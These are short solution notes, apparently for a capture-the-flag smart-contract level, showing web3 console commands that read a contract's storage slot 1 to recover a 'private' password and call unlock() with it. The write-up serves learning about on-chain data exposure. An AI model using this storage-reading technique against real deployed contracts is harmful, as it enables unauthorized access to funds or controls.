* Storage : await web3.utils.hexToAscii(await web3.eth.getStorageAt('0x67e021593D6a79C57eEF99B8F5CA5031aD2fBed0',1)); will access the slot 1. If several variables can fit a single slot, then there will be.
* In assembly you can access from a contract the storage of this contract, but not others contracts

So in console :
* To see in ascii the pwd : await web3.utils.hexToAscii(await web3.eth.getStorageAt('0x67e021593D6a79C57eEF99B8F5CA5031aD2fBed0',1));
* To solve the pb :
 * let x = await web3.eth.getStorageAt('0x67e021593D6a79C57eEF99B8F5CA5031aD2fBed0',1);
 * await contract.unlock(x);
